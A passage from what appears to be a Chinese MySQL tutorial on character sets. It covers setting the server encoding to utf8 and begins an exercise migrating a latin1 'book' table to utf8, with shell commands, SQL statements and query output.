|&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 || swe7&#xA0;&#xA0;&#xA0;&#xA0; | 7bit Swedish&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | swe7_swedish_ci&#xA0;&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 || ascii&#xA0;&#xA0;&#xA0; | US ASCII&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | ascii_general_ci&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 || ujis&#xA0;&#xA0;&#xA0;&#xA0; | EUC-JP Japanese&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | ujis_japanese_ci&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 3 || sjis&#xA0;&#xA0;&#xA0;&#xA0; | Shift-JIS Japanese&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | sjis_japanese_ci&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 2 || hebrew&#xA0;&#xA0; | ISO 8859-8 Hebrew&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | hebrew_general_ci&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 || tis620&#xA0;&#xA0; | TIS620 Thai&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;| tis620_thai_ci&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 || euckr&#xA0;&#xA0;&#xA0; | EUC-KR Korean&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | euckr_korean_ci&#xA0;&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 2 || koi8u&#xA0;&#xA0;&#xA0; | KOI8-U Ukrainian&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | koi8u_general_ci&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 || gb2312&#xA0;&#xA0; | GB2312 Simplified Chinese&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | gb2312_chinese_ci&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 2 || greek&#xA0;&#xA0;&#xA0; | ISO 8859-7 Greek&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | greek_general_ci&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 || cp1250&#xA0;&#xA0; | Windows Central European&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | cp1250_general_ci&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 || gbk&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | GBK Simplified Chinese&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | gbk_chinese_ci&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 2 || latin5&#xA0;&#xA0; | ISO 8859-9 Turkish&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | latin5_turkish_ci&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 || armscii8 | ARMSCII-8 Armenian&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | armscii8_general_ci |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 || utf8&#xA0;&#xA0;&#xA0;&#xA0; | UTF-8 Unicode&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | utf8_general_ci&#xA0;&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 3 || ucs2&#xA0;&#xA0;&#xA0;&#xA0; | UCS-2 Unicode&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | ucs2_general_ci&#xA0;&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 2 || cp866&#xA0;&#xA0;&#xA0; | DOS Russian&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | cp866_general_ci&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 || keybcs2&#xA0; | DOS Kamenicky Czech-Slovak&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | keybcs2_general_ci&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 || macce&#xA0;&#xA0;&#xA0; | Mac Central European&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;| macce_general_ci&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 || macroman | Mac West European&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | macroman_general_ci |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 || cp852&#xA0;&#xA0;&#xA0; | DOS Central European&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | cp852_general_ci&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 || latin7&#xA0;&#xA0; | ISO 8859-13 Baltic&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | latin7_general_ci&#xA0; &#xA0;|&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 || utf8mb4&#xA0; | UTF-8 Unicode&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | utf8mb4_general_ci&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 4 || cp1251&#xA0;&#xA0; | Windows Cyrillic&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | cp1251_general_ci&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 || utf16&#xA0;&#xA0;&#xA0; | UTF-16 Unicode&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | utf16_general_ci&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 4 || utf16le &#xA0;| UTF-16LE Unicode&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | utf16le_general_ci&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 4 || cp1256&#xA0;&#xA0; | Windows Arabic&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | cp1256_general_ci&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 || cp1257&#xA0;&#xA0; | Windows Baltic&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | cp1257_general_ci&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 || utf32&#xA0;&#xA0;&#xA0; | UTF-32 Unicode&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;| utf32_general_ci&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 4 || binary&#xA0;&#xA0; | Binary pseudo charset&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | binary&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 || geostd8&#xA0; | GEOSTD8 Georgian&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | geostd8_general_ci&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 || cp932&#xA0;&#xA0;&#xA0; | SJIS for Windows Japanese&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | cp932_japanese_ci&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 2 || eucjpms&#xA0; | UJIS for Windows Japanese&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | eucjpms_japanese_ci |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 3 || gb18030&#xA0; | China National Standard GB18030 | gb18030_chinese_ci&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 4 |+----------+---------------------------------+---------------------+--------+41 rows in set (0.00 sec)``` **&#x6539;&#x5B57;&#x7B26;&#x7F16;&#x7801;**```shell [root@jaking ~]# echo character_set_server=utf8 &gt;&gt; /etc/my.cnf[root@jaking ~]# cat /etc/my.cnf[client]port=3306socket=/data/mysql/mysql.sock [mysqld]character-set-server=utf8collation-server=utf8_general_ci skip-name-resolveuser=mysqlport=3306basedir=/usr/local/mysql57datadir=/data/mysqltmpdir=/tmpsocket=/data/mysql/mysql.sock log-error=/data/mysql/mysqld.logpid-file=/data/mysql/mysqld.pid default-storage-engine=InnoDBcharacter_set_server=utf8[root@jaking ~]# systemctl restart mysqld[root@jaking ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.&#xA0; Commands end with ; or \\g.Your MySQL connection id is 4Server version: 5.7.19 Source distribution Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved. Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners. Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement. 12345678910111213141516171819202122232425mysql&gt; show variables like &apos;character_set%&apos;;+--------------------------+------------------------------------+| Variable_name&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | Value&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |+--------------------------+------------------------------------+| character_set_client&#xA0;&#xA0;&#xA0;&#xA0; | utf8&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; || character_set_connection | utf8&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; || character_set_database&#xA0;&#xA0; | utf8&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;|| character_set_filesystem | binary&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; || character_set_results&#xA0;&#xA0;&#xA0; | utf8&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; || character_set_server&#xA0;&#xA0;&#xA0;&#xA0; | utf8&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; || character_set_system&#xA0;&#xA0;&#xA0;&#xA0; | utf8&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;|| character_sets_dir&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | /usr/local/mysql57/share/charsets/ |+--------------------------+------------------------------------+8 rows in set (0.00 sec)mysql&gt; create database testdb; Query OK, 1 row affected (0.00 sec)mysql&gt; show create database testdb;+----------+-----------------------------------------------------------------+| Database | Create Database |+----------+-----------------------------------------------------------------+| testdb | CREATE DATABASE `testdb` /*!40100 DEFAULT CHARACTER SET utf8 */ |+----------+-----------------------------------------------------------------+1 row in set (0.00 sec) 6&#xFF1A;&#x5B9E;&#x6218;&#xFF1A;&#x8FC1;&#x79FB;&#x6570;&#x636E; &#x80CC;&#x666F;&#xFF1A;&#x516C;&#x53F8;&#x4E1A;&#x52A1;&#x6570;&#x636E;book,&#x7531;&#x4E8E;&#x4E4B;&#x524D;&#x5EFA;&#x8868;&#x6CA1;&#x6CE8;&#x610F;&#x5B57;&#x7B26;&#x96C6;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x5BFC;&#x81F4;&#x4E4B;&#x524D;&#x5199;&#x5165;&#x7684;&#x6570;&#x636E;&#x51FA;&#x73B0;&#x4E71;&#x7801;&#xFF1B;&#x73B0;&#x5728;&#x8981;&#x5C06;&#x4E4B;&#x524D;&#x7684;&#x6570;&#x636E;&#x548C;&#x73B0;&#x5728;&#x6570;&#x636E;&#x7684;&#x5B57;&#x7B26;&#x96C6;&#x4E00;&#x81F4;&#xFF0C;&#x4E0D;&#x51FA;&#x73B0;&#x4E71;&#x7801;&#x60C5;&#x51B5;&#xFF1B;&#x5C06;&#x5B57;&#x7B26;&#x96C6;&#x4E3A;latin1&#x5DF2;&#x6709;&#x8BB0;&#x5F55;&#x7684;&#x6570;&#x636E;&#x8F6C;&#x6210;utf8&#xFF0C;&#x5E76;&#x4E14;&#x5DF2;&#x7ECF;&#x5B58;&#x5728;&#x7684;&#x8BB0;&#x5F55;&#x4E0D;&#x4E71;&#x7801; &#x6B65;&#x9AA4; 1&#xFF1A;&#x5EFA;&#x5E93;&#x53CA;&#x5EFA;&#x8868;&#x7684;&#x8BED;&#x53E5;&#x5BFC;&#x51FA;&#xFF0C;sed&#x6279;&#x91CF;&#x4FEE;&#x6539;&#x4E3A;utf8 2&#xFF1A;&#x5BFC;&#x51FA;&#x4E4B;&#x524D;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E; 3&#xFF1A;&#x4FEE;&#x6539;mysql&#x670D;&#x52A1;&#x7AEF;&#x548C;&#x5BA2;&#x6237;&#x7AEF;&#x7F16;&#x7801;&#x4E3A;utf8 4&#xFF1A;&#x5220;&#x9664;&#x539F;&#x6709;&#x7684;&#x5E93;&#x8868;&#x53CA;&#x6570;&#x636E; 5&#xFF1A;&#x5BFC;&#x5165;&#x65B0;&#x7684;&#x5EFA;&#x5E93;&#x53CA;&#x5EFA;&#x8868;&#x8BED;&#x53E5; 6&#xFF1A;&#x5BFC;&#x5165;&#x4E4B;&#x524D;&#x7684;&#x6570;&#x636E; &#x51C6;&#x5907;&#x521B;&#x5EFA;&#x6D4B;&#x8BD5;&#x5E93;&#x548C;&#x8868;&#x7684;SQL&#x8BED;&#x53E5;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162CREATE DATABASE testbookdb;#CREATE DATABASE `testbookdb` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;show databases;use testbookdb;CREATE TABLE book1 (bTypeId int,bName char(16),price int,publishing char(16));INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;1&apos;,&apos;&#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;&apos;,&apos;66&apos;,&apos;&#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;2&apos;,&apos;&#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B;&apos;,&apos;68&apos;,&apos;&#x4EBA;&#x6C11;&#x90AE;&#x7535;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;3&apos;,&apos;&#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B;&apos;,&apos;90&apos;,&apos;&#x673A;&#x68B0;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;4&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B;&apos;,&apos;71&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;5&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL2&#x300B;&apos;,&apos;72&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;6&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL3&#x300B;&apos;,&apos;73&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;7&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL4&#x300B;&apos;,&apos;74&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;8&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL5&#x300B;&apos;,&apos;75&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;9&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL6&#x300B;&apos;,&apos;76&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;10&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL7&#x300B;&apos;,&apos;77&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;11&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL8&#x300B;&apos;,&apos;78&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;12&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL9&#x300B;&apos;,&apos;79&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);CREATE TABLE book1 (bTypeId int,bName char(16),price int,publishing char(16));INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;1&apos;,&apos;Linux&apos;,&apos;66&apos;,&apos;DZ&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;2&apos;,&apos;CLD&apos;,&apos;68&apos;,&apos;RM&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;3&apos;,&apos;OS&apos;,&apos;90&apos;,&apos;JX&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;4&apos;,&apos;MySQL1&apos;,&apos;71&apos;,&apos;QH&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;5&apos;,&apos;MySQL2&apos;,&apos;72&apos;,&apos;QH&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;6&apos;,&apos;MySQL3&apos;,&apos;73&apos;,&apos;QH&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;7&apos;,&apos;MySQL4&apos;,&apos;74&apos;,&apos;QH&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;8&apos;,&apos;MySQL5&apos;,&apos;75&apos;,&apos;QH&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;9&apos;,&apos;MySQL6&apos;,&apos;76&apos;,&apos;QH&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;10&apos;,&apos;MySQL7&apos;,&apos;77&apos;,&apos;QH&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;11&apos;,&apos;MySQL8&apos;,&apos;78&apos;,&apos;QH&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;12&apos;,&apos;MySQL9&apos;,&apos;79&apos;,&apos;QH&apos;);mysql&gt; create database book;Query OK, 1 row affected (0.00 sec)mysql&gt; show create database book;+----------+---------------------------------------------------------------+| Database | Create Database |+----------+---------------------------------------------------------------+| book | CREATE DATABASE `book` /*!40100 DEFAULT CHARACTER SET utf8 */ |+----------+---------------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; use book;Database changedmysql&gt; CREATE TABLE book1 (bTypeId int,bName char(16),price int,publishing char(16)) character set latin1;Query OK, 0 rows affected (0.00 sec) mysql&gt; show CREATE TABLE book1;+-------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| Table | Create Table&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;|+-------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| book1 | CREATE TABLE `book1` (&#xA0; `bTypeId` int(11) DEFAULT NULL,&#xA0; `bName` char(16) DEFAULT NULL,&#xA0; `price` int(11) DEFAULT NULL,&#xA0; `publishing` char(16) DEFAULT NULL) ENGINE=InnoDB DEFAULT CHARSET=latin1 |+-------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.02 sec) &#x4FEE;&#x6539;&#x6570;&#x636E;&#x5E93;&#x5B57;&#x7B26;&#x96C6;123456789101112131415161718mysql&gt; show create database book;+----------+---------------------------------------------------------------+| Database | Create Database&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |+----------+---------------------------------------------------------------+| book&#xA0;&#xA0;&#xA0;&#xA0; | CREATE DATABASE `book` /*!40100 DEFAULT CHARACTER SET utf8 */ |+----------+---------------------------------------------------------------+1 row in set (0.00 sec) mysql&gt; alter database book default character set latin1;Query OK, 1 row affected (0.00 sec) mysql&gt; show create database book;+----------+-----------------------------------------------------------------+| Database | Create 